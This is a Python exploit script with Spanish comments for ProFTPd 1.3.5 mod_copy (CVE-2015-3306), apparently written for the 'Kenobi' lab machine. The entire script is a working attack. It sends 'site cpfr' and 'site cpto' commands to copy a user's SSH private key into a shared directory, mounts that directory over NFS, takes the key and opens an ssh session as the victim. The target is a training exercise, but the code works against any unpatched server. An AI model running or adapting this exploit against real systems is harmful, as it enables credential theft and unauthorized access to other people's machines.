#!/usr/bin/python3

# Exploit:	ProFTPd 1.3.5 - Remote Command Execution
# Autor: 	ErickBuster
# Maquina:	Kenobi
# Software:	ProFTPd version 1.3.5
# CVE:		2015-3306
#
# Descripcion Vulnerabilidad: Permite a los atacantes remotos leer y escribir en ficheros arbitrarios a traves de los comandos site cpfr y site cpto
# Descripcion particular: Automatiza la instruccion a la maquina Kenobi ejecutando comandos remotamente por medio del software ProFTPd version 1.3.5.

import socket
import sys
import os
import signal
def def_exit(sig, frame):
	print("\n[+]Saliendo...\n")
	sys.exit(1)
#Ctrl+c
signal.signal(signal.SIGINT, def_exit)

#variables
rhost = ""
rport = 21
machine = "kenobi"
msj = b'site cpfr /home/kenobi/.ssh/id_rsa'
msj2 = b'site cpto /var/tmp/id_rsa'
buffer = 1024
data = ""

if(len(sys.argv) < 2):
	print("\n[?] Usage: kenobi_exploit.py <rhost>")
else:
	rhost = sys.argv[1]
	print(rhost)
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((rhost, rport))
	print("Conectando...")
	info = sock.recv(buffer)
	print(f"[+]INFO: {info.decode()}".rstrip())
	while 1:
		if data == b'250 Copy successful\r\n':
			print("[+]Terminado!!!.\n")
			sock.close()
			break
		else:
			print("[*]Enviando mensajes...")
			sock.send(msj + b'\n')
			print(f"\t[+]Texto 1: '{msj.decode()}' enviado.")
			sock.recv(buffer)
			sock.send(msj2 + b'\n')
			print(f"\t[+]Texto 2: '{msj2.decode()}' enviado.")
			data = sock.recv(buffer)
		print(

"\t[+]" + data.decode())
	print(f"[*]Conectandose a la maquina {machine}")
	print("[*]Creando carpeta...")
	os.system(f"mkdir /tmp/{machine}")
	print("[*]Montando NFS")
	os.system(f"sudo mount {rhost}:/var/tmp /tmp/{machine}")
	os.system(f"cp /tmp/{machine}/id_rsa /tmp/id_rsa")
	os.system(f"sudo umount /tmp/{machine}")
	os.system(f"sudo rmdir /tmp/{machine}")
	print(f"[*]Creando una coneccion por ssh con la maquina {machine}")
	os.system("chmod 600 /tmp/id_rsa")
	print("[+]Coneccion establecida...")
	os.system(f"ssh -i /tmp/id_rsa {machine}@{rhost}")
	os.system("rm /tmp/id_rsa")
